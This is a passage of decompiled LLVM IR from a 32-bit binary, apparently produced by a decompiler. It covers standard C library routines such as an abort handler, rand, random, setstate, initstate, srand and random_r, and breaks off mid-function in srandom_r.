  %v2_8053cd9 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8053cd9, i32* @ebx, align 4
  %v4_8053ce1 = call i32 @__sigaddset(i32 %v2_8053cd9, i32 6, i32 %v0_8053cd5, i32 %v0_8053cd5)
  store i32 %v4_8053ce1, i32* %eax.global-to-local, align 4
  %v1_8053ce9 = icmp eq i32 %v4_8053ce1, 0
  %v1_8053ceb = icmp eq i1 %v1_8053ce9, false
  br i1 %v1_8053ceb, label %dec_label_pc_8053cfb, label %dec_label_pc_8053ced

dec_label_pc_8053ced:                             ; preds = %dec_label_pc_8053cd5
  %v3_8053cf3 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8053cf3 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8053cf3, i32 0)
  store i32 %v4_8053cf3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053cfb

dec_label_pc_8053cfb:                             ; preds = %dec_label_pc_8053cd5, %dec_label_pc_8053ced
  %v2_8053d334 = phi i32 [ %v4_8053ce1, %dec_label_pc_8053cd5 ], [ %v4_8053cf3, %dec_label_pc_8053ced ]
  %v0_8053cfb = load i8, i8* @global_var_8061760.523, align 32
  %v1_8053cfb = icmp eq i8 %v0_8053cfb, 0
  %v1_8053d02 = icmp eq i1 %v1_8053cfb, false
  br i1 %v1_8053d02, label %dec_label_pc_8053d33, label %dec_label_pc_8053d04

dec_label_pc_8053d04:                             ; preds = %dec_label_pc_8053cfb
  store i8 1, i8* @global_var_8061760.523, align 32
  br label %dec_label_pc_8053d0b

dec_label_pc_8053d0b:                             ; preds = %dec_label_pc_8053d72, %dec_label_pc_8053d04
  %v1_8053d13 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b3e8.522 to i32))
  store i32 %v1_8053d13, i32* %eax.global-to-local, align 4
  %v1_8053d1f = call i32 @__raise(i32 6)
  store i32 %v1_8053d1f, i32* %eax.global-to-local, align 4
  %v1_8053d2b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b3e8.522 to i32))
  store i32 %v1_8053d2b, i32* %eax.global-to-local, align 4
  %v0_8053d33.pre = load i8, i8* @global_var_8061760.523, align 32
  br label %dec_label_pc_8053d33

dec_label_pc_8053d33:                             ; preds = %dec_label_pc_8053cfb, %dec_label_pc_8053d0b
  %v2_8053d33 = phi i32 [ %v2_8053d334, %dec_label_pc_8053cfb ], [ %v1_8053d2b, %dec_label_pc_8053d0b ]
  %v0_8053d33 = phi i8 [ %v0_8053cfb, %dec_label_pc_8053cfb ], [ %v0_8053d33.pre, %dec_label_pc_8053d0b ]
  %v1_8053d33 = zext i8 %v0_8053d33 to i32
  %v3_8053d33 = and i32 %v2_8053d33, -256
  %v4_8053d33 = or i32 %v1_8053d33, %v3_8053d33
  store i32 %v4_8053d33, i32* %eax.global-to-local, align 4
  %v10_8053d38 = icmp eq i8 %v0_8053d33, 1
  %v1_8053d3a = icmp eq i1 %v10_8053d38, false
  br i1 %v1_8053d3a, label %dec_label_pc_8053d94, label %dec_label_pc_8053d3c

dec_label_pc_8053d3c:                             ; preds = %dec_label_pc_8053d33
  store i8 2, i8* @global_var_8061760.523, align 32
  %v2_8053d4b = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8053d4b, i32* %eax.global-to-local, align 4
  %v3_8053d50 = bitcast i32* %stack_var_-272 to i8*
  %v4_8053d50 = call i32 @__GI_memset(i8* %v3_8053d50, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053d67

dec_label_pc_8053d67:                             ; preds = %dec_label_pc_8053d67.dec_label_pc_8053d67_crit_edge, %dec_label_pc_8053d3c
  %v0_8053d67 = phi i32 [ %v12_8053cc2, %dec_label_pc_8053d3c ], [ %v0_8053d67.pre, %dec_label_pc_8053d67.dec_label_pc_8053d67_crit_edge ]
  %v1_8053d6f21 = phi i32 [ 31, %dec_label_pc_8053d3c ], [ %v1_8053d6f, %dec_label_pc_8053d67.dec_label_pc_8053d67_crit_edge ]
  %v2_8053d67 = mul i32 %v1_8053d6f21, 4
  %v3_8053d67 = add i32 %v2_8053d67, 16
  %v4_8053d67 = add i32 %v3_8053d67, %v0_8053d67
  %v5_8053d67 = inttoptr i32 %v4_8053d67 to i32*
  store i32 -1, i32* %v5_8053d67, align 4
  %v0_8053d6f.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d6f = add i32 %v0_8053d6f.pre, -1
  %v9_8053d6f = icmp slt i32 %v1_8053d6f, 0
  store i32 %v1_8053d6f, i32* %eax.global-to-local, align 4
  %v1_8053d70 = icmp eq i1 %v9_8053d6f, false
  br i1 %v1_8053d70, label %dec_label_pc_8053d67.dec_label_pc_8053d67_crit_edge, label %dec_label_pc_8053d72

dec_label_pc_8053d67.dec_label_pc_8053d67_crit_edge: ; preds = %dec_label_pc_8053d67
  %v0_8053d67.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053d67

dec_label_pc_8053d72:                             ; preds = %dec_label_pc_8053d67
  store i32 %v2_8053d4b, i32* %eax.global-to-local, align 4
  %v4_8053d87 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8053d87, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053d0b

dec_label_pc_8053d94:                             ; preds = %dec_label_pc_8053d33
  %v10_8053d94 = icmp eq i8 %v0_8053d33, 2
  %v1_8053d96 = icmp eq i1 %v10_8053d94, false
  br i1 %v1_8053d96, label %dec_label_pc_8053da0, label %dec_label_pc_8053da0.thread

dec_label_pc_8053da0.thread:                      ; preds = %dec_label_pc_8053d94
  store i8 3, i8* @global_var_8061760.523, align 32
  br label %dec_label_pc_8053da9

dec_label_pc_8053da0:                             ; preds = %dec_label_pc_8053d94
  %v9_8053da0 = icmp eq i8 %v0_8053d33, 3
  %v1_8053da7 = icmp eq i1 %v9_8053da0, false
  br i1 %v1_8053da7, label %dec_label_pc_8053dba, label %dec_label_pc_8053da9

dec_label_pc_8053da9:                             ; preds = %dec_label_pc_8053da0.thread, %dec_label_pc_8053da0
  store i8 4, i8* @global_var_8061760.523, align 32
  %v1_8053db5 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8053dba:                             ; preds = %dec_label_pc_8053da0, %dec_label_pc_8053dba
  br label %dec_label_pc_8053dba

; uselistorder directives
  uselistorder i32 %v1_8053d6f, { 2, 1, 0 }
  uselistorder i32 %v1_8053cd2, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8 3, { 0, 5, 1, 2, 4, 3 }
  uselistorder i8* @global_var_8061760.523, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8053dba, { 1, 0 }
  uselistorder label %dec_label_pc_8053da9, { 1, 0 }
  uselistorder label %dec_label_pc_8053d33, { 1, 0 }
  uselistorder label %dec_label_pc_8053cfb, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8053dc0 = call i32 @random()
  ret i32 %v0_8053dc0

; uselistorder directives
  uselistorder i32 ()* @random, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053dc8 = load i32, i32* @ebx, align 4
  store i32 %v0_8053dc8, i32* %stack_var_-4, align 4
  %v2_8053dd6 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053dd6, i32* @ebx, align 4
  %v2_8053ddb = call i32 @__pthread_return_void(i32 %v2_8053dd6, i32 134563799)
  %v1_8053de7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b400.524 to i32))
  %v2_8053dee = ptrtoint i32* %stack_var_-8 to i32
  %v3_8053df8 = call i32 @__GI_random_r(i32* nonnull @global_var_805b418, i32 %v2_8053dee)
  store i32 ptrtoint (i32* @global_var_805b418 to i32), i32* @eax, align 4
  %v2_8053e02 = call i32 @__pthread_return_void(i32 %v2_8053dd6, i32 1)
  %v3_8053e07 = load i32, i32* %stack_var_-8, align 4
  %v2_8053e0e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053e0e, i32* @ebx, align 4
  ret i32 %v3_8053e07
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8053e21 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053e21, i32* @eax, align 4
  %v2_8053e26 = call i32 @__pthread_return_void(i32 %v2_8053e21, i32 134563799)
  %v1_8053e32 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b400.524 to i32))
  %v0_8053e3e = load i32, i32* bitcast (i32** @global_var_805b420.527 to i32*), align 32
  store i32 %v0_8053e3e, i32* @ebx, align 4
  %v3_8053e48 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805b418)
  %v2_8053e50 = icmp slt i32 %v3_8053e48, 0
  br i1 %v2_8053e50, label %dec_label_pc_8053e57, label %dec_label_pc_8053e54

dec_label_pc_8053e54:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805b41c.528 to i32), i32* @esi, align 4
  br label %dec_label_pc_8053e57

dec_label_pc_8053e57:                             ; preds = %entry, %dec_label_pc_8053e54
  store i32 %v2_8053e21, i32* @eax, align 4
  %v2_8053e60 = call i32 @__pthread_return_void(i32 %v2_8053e21, i32 1)
  %v0_8053e65 = load i32, i32* @esi, align 4
  ret i32 %v0_8053e65

; uselistorder directives
  uselistorder label %dec_label_pc_8053e57, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8053e7c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053e7c, i32* @ebx, align 4
  %v2_8053e81 = call i32 @__pthread_return_void(i32 %v2_8053e7c, i32 134563799)
  %v1_8053e8d = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b400.524 to i32))
  %v0_8053e97 = load i32, i32* bitcast (i32** @global_var_805b420.527 to i32*), align 32
  store i32 %v0_8053e97, i32* @esi, align 4
  %v4_8053ea9 = inttoptr i32 %arg2 to i32*
  %v5_8053ea9 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8053ea9, i32 %arg3, i32 ptrtoint (i32* @global_var_805b418 to i32))
  store i32 %v5_8053ea9, i32* @eax, align 4
  %v2_8053eb4 = call i32 @__pthread_return_void(i32 %v2_8053e7c, i32 1)
  ret i32 ptrtoint (i32** @global_var_805b41c.528 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053ec4 = load i32, i32* @ebx, align 4
  store i32 %v0_8053ec4, i32* %stack_var_-4, align 4
  %v2_8053ed2 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8053ed2, i32* @ebx, align 4
  %v2_8053ed7 = call i32 @__pthread_return_void(i32 %v2_8053ed2, i32 134563799)
  %v1_8053ee3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b400.524 to i32))
  %v2_8053ef3 = sext i32 %arg1 to i64
  %v3_8053ef3 = call i32 @srandom_r(i64 %v2_8053ef3, i32 ptrtoint (i32* @global_var_805b418 to i32))
  store i32 ptrtoint (i32* @global_var_805b418 to i32), i32* @eax, align 4
  %v2_8053efd = call i32 @__pthread_return_void(i32 %v2_8053ed2, i32 1)
  %v2_8053f05 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053f05, i32* @ebx, align 4
  ret i32 %v2_8053efd

; uselistorder directives
  uselistorder i32* @global_var_805b418, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805b418 to i32), { 1, 3, 2, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_8053f0b = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_8053f17 = add i32 %arg1, 4
  store i32 %v1_8053f17, i32* %esi.global-to-local, align 4
  %v1_8053f1a = add i32 %tmp4, 12
  %v2_8053f1a = inttoptr i32 %v1_8053f1a to i32*
  %v3_8053f1a = load i32, i32* %v2_8053f1a, align 4
  store i32 %v3_8053f1a, i32* %ecx.global-to-local, align 4
  %v1_8053f1d = add i32 %tmp4, 8
  %v2_8053f1d = inttoptr i32 %v1_8053f1d to i32*
  %v3_8053f1d = load i32, i32* %v2_8053f1d, align 4
  %v1_8053f20 = icmp eq i32 %v3_8053f1a, 0
  %v1_8053f22 = icmp eq i1 %v1_8053f20, false
  br i1 %v1_8053f22, label %dec_label_pc_8053f2d, label %dec_label_pc_8053f24

dec_label_pc_8053f24:                             ; preds = %entry
  %v1_8053f24 = add i32 %v3_8053f1d, -4
  %v2_8053f24 = inttoptr i32 %v1_8053f24 to i32*
  store i32 0, i32* %v2_8053f24, align 4
  br label %dec_label_pc_8053f3d

dec_label_pc_8053f2d:                             ; preds = %entry
  %v1_8053f2d = add i32 %tmp4, 4
  %v2_8053f2d = inttoptr i32 %v1_8053f2d to i32*
  %v3_8053f2d = load i32, i32* %v2_8053f2d, align 4
  %v2_8053f30 = sub i32 %v3_8053f2d, %v3_8053f1d
  %v2_8053f32 = sdiv i32 %v2_8053f30, 4
  %v3_8053f35 = mul i32 %v2_8053f32, 5
  %v2_8053f38 = add i32 %v3_8053f35, %v3_8053f1a
  store i32 %v2_8053f38, i32* %eax.global-to-local, align 4
  %v2_8053f3a = add i32 %v3_8053f1d, -4
  %v3_8053f3a = inttoptr i32 %v2_8053f3a to i32*
  store i32 %v2_8053f38, i32* %v3_8053f3a, align 4
  br label %dec_label_pc_8053f3d

dec_label_pc_8053f3d:                             ; preds = %dec_label_pc_8053f24, %dec_label_pc_8053f2d
  %v0_8053f3d = load i32, i32* %esi.global-to-local, align 4
  %v1_8053f3d = add i32 %v0_8053f3d, -4
  %v2_8053f3d = inttoptr i32 %v1_8053f3d to i32*
  %v3_8053f3d = load i32, i32* %v2_8053f3d, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8053f45 = ashr i32 %v3_8053f3d, 31
  %v2_8053f46 = zext i32 %v3_8053f3d to i64
  %v4_8053f46 = zext i32 %v1_8053f45 to i64
  %v5_8053f46 = mul nuw i64 %v4_8053f46, 4294967296
  %v6_8053f46 = or i64 %v5_8053f46, %v2_8053f46
  %v8_8053f46 = sdiv i64 %v6_8053f46, 5
  %v9_8053f46 = trunc i64 %v8_8053f46 to i32
  store i32 %v9_8053f46, i32* %eax.global-to-local, align 4
  %v10_8053f46 = srem i64 %v6_8053f46, 5
  %v11_8053f46 = trunc i64 %v10_8053f46 to i32
  %v6_8053f4b = icmp ugt i32 %v11_8053f46, 4
  br i1 %v6_8053f4b, label %dec_label_pc_8053f8b, label %dec_label_pc_8053f4d

dec_label_pc_8053f4d:                             ; preds = %dec_label_pc_8053f3d
  %v1_8053f4d = mul i32 %v11_8053f46, 4
  %v2_8053f4d = add i32 %v1_8053f4d, ptrtoint (i32* @global_var_805a474.529 to i32)
  %v3_8053f4d = inttoptr i32 %v2_8053f4d to i32*
  %v4_8053f4d = load i32, i32* %v3_8053f4d, align 4
  store i32 %v4_8053f4d, i32* %ecx.global-to-local, align 4
  %v2_8053f54 = add i32 %v1_8053f4d, ptrtoint (i32* @global_var_805a460.530 to i32)
  %v3_8053f54 = inttoptr i32 %v2_8053f54 to i32*
  %v4_8053f54 = load i32, i32* %v3_8053f54, align 4
  store i32 %v4_8053f54, i32* %ebp.global-to-local, align 4
  %v1_8053f5b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053f5b = add i32 %v1_8053f5b, 16
  %v3_8053f5b = inttoptr i32 %v2_8053f5b to i32*
  store i32 %v4_8053f4d, i32* %v3_8053f5b, align 4
  %v0_8053f5e = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053f5e = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053f5e = add i32 %v1_8053f5e, 20
  %v3_8053f5e = inttoptr i32 %v2_8053f5e to i32*
  store i32 %v0_8053f5e, i32* %v3_8053f5e, align 4
  %v1_8053f61 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053f61 = add i32 %v1_8053f61, 12
  %v3_8053f61 = inttoptr i32 %v2_8053f61 to i32*
  store i32 %v11_8053f46, i32* %v3_8053f61, align 4
  %v1_8053f64 = icmp eq i32 %v11_8053f46, 0
  br i1 %v1_8053f64, label %dec_label_pc_8053f7e, label %dec_label_pc_8053f68

dec_label_pc_8053f68:                             ; preds = %dec_label_pc_8053f4d
  %v0_8053f68 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053f68 = add i32 %v0_8053f68, -4
  %v2_8053f68 = inttoptr i32 %v1_8053f68 to i32*
  %v3_8053f68 = load i32, i32* %v2_8053f68, align 4
  %v1_8053f6b = ashr i32 %v3_8053f68, 31
  %v0_8053f6c = load i32, i32* %edi.global-to-local, align 4
  %v2_8053f6c = zext i32 %v3_8053f68 to i64
  %v4_8053f6c = zext i32 %v1_8053f6b to i64
  %v5_8053f6c = mul nuw i64 %v4_8053f6c, 4294967296
  %v6_8053f6c = or i64 %v5_8053f6c, %v2_8053f6c
  %v7_8053f6c = zext i32 %v0_8053f6c to i64
  %v8_8053f6c = sdiv i64 %v6_8053f6c, %v7_8053f6c
  %v9_8053f6c = trunc i64 %v8_8053f6c to i32
  %v2_8053f6e = mul i32 %v9_8053f6c, 4
  %v3_8053f6e = add i32 %v2_8053f6e, %v0_8053f68
  %v1_8053f71 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053f71 = add i32 %v1_8053f71, %v9_8053f6c
  store i32 %v2_8053f71, i32* %eax.global-to-local, align 4
  %v1_8053f73 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053f73 = add i32 %v1_8053f73, 4
  %v3_8053f73 = inttoptr i32 %v2_8053f73 to i32*
  store i32 %v3_8053f6e, i32* %v3_8053f73, align 4
  %v0_8053f76 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f76 = ashr i32 %v0_8053f76, 31
  %v0_8053f77 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053f77 = zext i32 %v0_8053f76 to i64
  %v4_8053f77 = zext i32 %v1_8053f76 to i64
  %v5_8053f77 = mul nuw i64 %v4_8053f77, 4294967296
  %v6_8053f77 = or i64 %v5_8053f77, %v2_8053f77
  %v7_8053f77 = zext i32 %v0_8053f77 to i64
  %v8_8053f77 = sdiv i64 %v6_8053f77, %v7_8053f77
  %v9_8053f77 = trunc i64 %v8_8053f77 to i32
  store i32 %v9_8053f77, i32* %eax.global-to-local, align 4
  %v10_8053f77 = srem i64 %v6_8053f77, %v7_8053f77
  %v11_8053f77 = trunc i64 %v10_8053f77 to i32
  %v0_8053f79 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053f79 = mul i32 %v11_8053f77, 4
  %v3_8053f79 = add i32 %v2_8053f79, %v0_8053f79
  %v1_8053f7c = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053f7c = inttoptr i32 %v1_8053f7c to i32*
  store i32 %v3_8053f79, i32* %v2_8053f7c, align 4
  br label %dec_label_pc_8053f7e

dec_label_pc_8053f7e:                             ; preds = %dec_label_pc_8053f4d, %dec_label_pc_8053f68
  %v0_8053f7e = load i32, i32* %esi.global-to-local, align 4
  %v1_8053f7e = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053f7e = mul i32 %v1_8053f7e, 4
  %v3_8053f7e = add i32 %v2_8053f7e, %v0_8053f7e
  store i32 %v3_8053f7e, i32* %eax.global-to-local, align 4
  %v1_8053f81 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053f81 = add i32 %v1_8053f81, 8
  %v3_8053f81 = inttoptr i32 %v2_8053f81 to i32*
  store i32 %v0_8053f7e, i32* %v3_8053f81, align 4
  %v0_8053f84 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f84 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053f84 = add i32 %v1_8053f84, 24
  %v3_8053f84 = inttoptr i32 %v2_8053f84 to i32*
  store i32 %v0_8053f84, i32* %v3_8053f84, align 4
  br label %dec_label_pc_8053f99

dec_label_pc_8053f8b:                             ; preds = %dec_label_pc_8053f3d
  %v1_8053f8b = call i32 @__errno_location(i32 %v0_8053f0b)
  store i32 %v1_8053f8b, i32* %eax.global-to-local, align 4
  %v1_8053f90 = inttoptr i32 %v1_8053f8b to i32*
  store i32 22, i32* %v1_8053f90, align 4
  br label %dec_label_pc_8053f99

dec_label_pc_8053f99:                             ; preds = %dec_label_pc_8053f7e, %dec_label_pc_8053f8b
  %storemerge = phi i32 [ -1, %dec_label_pc_8053f8b ], [ 0, %dec_label_pc_8053f7e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8053f0b, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8053f7e, { 1, 0 }
  uselistorder i32 %v11_8053f46, { 3, 1, 2, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_8053f99, { 1, 0 }
  uselistorder label %dec_label_pc_8053f7e, { 1, 0 }
  uselistorder label %dec_label_pc_8053f3d, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8053fa4 = load i32, i32* @ebx, align 4
  store i32 %v0_8053fa4, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8053fad = add i32 %tmp2, 8
  %v2_8053fad = inttoptr i32 %v1_8053fad to i32*
  %v3_8053fad = load i32, i32* %v2_8053fad, align 4
  store i32 %v3_8053fad, i32* %esi.global-to-local, align 4
  %v1_8053fb0 = add i32 %tmp2, 12
  %v2_8053fb0 = inttoptr i32 %v1_8053fb0 to i32*
  %v3_8053fb0 = load i32, i32* %v2_8053fb0, align 4
  %v4_8053fb0 = icmp eq i32 %v3_8053fb0, 0
  %v1_8053fb4 = icmp eq i1 %v4_8053fb0, false
  br i1 %v1_8053fb4, label %dec_label_pc_8053fcd, label %dec_label_pc_8053fb6

dec_label_pc_8053fb6:                             ; preds = %entry
  %v2_8053fb6 = inttoptr i32 %v3_8053fad to i32*
  %v3_8053fb6 = load i32, i32* %v2_8053fb6, align 4
  %v5_8053fb6 = mul i32 %v3_8053fb6, 1103515245
  %v1_8053fbc = add i32 %v5_8053fb6, 12345
  %v1_8053fc1 = urem i32 %v1_8053fbc, -2147483648
  store i32 %v1_8053fc1, i32* %eax.global-to-local, align 4
  store i32 %v1_8053fc1, i32* %v2_8053fb6, align 4
  %v0_8053fc8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053fc8 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053fc8 = inttoptr i32 %v1_8053fc8 to i32*
  store i32 %v0_8053fc8, i32* %v2_8053fc8, align 4
  br label %dec_label_pc_8053ff9

dec_label_pc_8053fcd:                             ; preds = %entry
  %v1_8053fcd = add i32 %tmp2, 4
  %v2_8053fcd = inttoptr i32 %v1_8053fcd to i32*
  %v3_8053fcd = load i32, i32* %v2_8053fcd, align 4
  store i32 %v3_8053fcd, i32* %ecx.global-to-local, align 4
  %v2_8053fd0 = load i32, i32* %arg1, align 4
  store i32 %v2_8053fd0, i32* %edx.global-to-local, align 4
  %v1_8053fd2 = add i32 %tmp2, 24
  %v2_8053fd2 = inttoptr i32 %v1_8053fd2 to i32*
  %v3_8053fd2 = load i32, i32* %v2_8053fd2, align 4
  store i32 %v3_8053fd2, i32* %edi.global-to-local, align 4
  %v1_8053fd5 = inttoptr i32 %v3_8053fcd to i32*
  %v2_8053fd5 = load i32, i32* %v1_8053fd5, align 4
  store i32 %v2_8053fd5, i32* %eax.global-to-local, align 4
  %v1_8053fd7 = inttoptr i32 %v2_8053fd0 to i32*
  %v2_8053fd7 = load i32, i32* %v1_8053fd7, align 4
  %v4_8053fd7 = add i32 %v2_8053fd7, %v2_8053fd5
  store i32 %v4_8053fd7, i32* %v1_8053fd7, align 4
  %v0_8053fd9 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053fd9 = inttoptr i32 %v0_8053fd9 to i32*
  %v2_8053fd9 = load i32, i32* %v1_8053fd9, align 4
  %v1_8053fdb = add i32 %v0_8053fd9, 4
  store i32 %v1_8053fdb, i32* %edx.global-to-local, align 4
  %v2_8053fde = udiv i32 %v2_8053fd9, 2
  %v1_8053fe0 = load i32, i32* %edi.global-to-local, align 4
  %v7_8053fe0 = icmp ult i32 %v1_8053fdb, %v1_8053fe0
  %v1_8053fe2 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053fe2 = inttoptr i32 %v1_8053fe2 to i32*
  store i32 %v2_8053fde, i32* %v2_8053fe2, align 4
  %v0_8053fe5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053fe5 = add i32 %v0_8053fe5, 4
  store i32 %v1_8053fe5, i32* %eax.global-to-local, align 4
  br i1 %v7_8053fe0, label %dec_label_pc_8053fee, label %dec_label_pc_8053fea

dec_label_pc_8053fea:                             ; preds = %dec_label_pc_8053fcd
  %v0_8053fea = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8053fea, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053ff4

dec_label_pc_8053fee:                             ; preds = %dec_label_pc_8053fcd
  %v1_8053fee = load i32, i32* %edi.global-to-local, align 4
  %v7_8053fee = icmp ult i32 %v1_8053fe5, %v1_8053fee
  br i1 %v7_8053fee, label %dec_label_pc_8053ff4, label %dec_label_pc_8053ff2

dec_label_pc_8053ff2:                             ; preds = %dec_label_pc_8053fee
  %v0_8053ff2 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8053ff2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ff4

dec_label_pc_8053ff4:                             ; preds = %dec_label_pc_8053fee, %dec_label_pc_8053fea, %dec_label_pc_8053ff2
  %v0_8053ff4 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053ff4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053ff4 = inttoptr i32 %v1_8053ff4 to i32*
  store i32 %v0_8053ff4, i32* %v2_8053ff4, align 4
  %v0_8053ff6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ff6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053ff6 = add i32 %v1_8053ff6, 4
  %v3_8053ff6 = inttoptr i32 %v2_8053ff6 to i32*
  store i32 %v0_8053ff6, i32* %v3_8053ff6, align 4
  br label %dec_label_pc_8053ff9

dec_label_pc_8053ff9:                             ; preds = %dec_label_pc_8053fb6, %dec_label_pc_8053ff4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8053ffb = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053ffb, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8053fc1, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053ff9, { 1, 0 }
  uselistorder label %dec_label_pc_8053ff4, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8054000 = load i32, i32* @ebp, align 4
  %v0_8054001 = load i32, i32* @edi, align 4
  %v0_8054002 = load i32, i32* @esi, align 4
  %v0_8054003 = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_805400e = trunc i64 %arg1 to i32
  store i32 %v4_805400e, i32* %eax.global-to-local, align 4
  %v1_8054012 = add i32 %arg2, 12
  %v2_8054012 = inttoptr i32 %v1_8054012 to i32*
  %v3_8054012 = load i32, i32* %v2_8054012, align 4
  store i32 %v3_8054012, i32* %edx.global-to-local, align 4
  %v6_8054018 = icmp ugt i32 %v3_8054012, 4
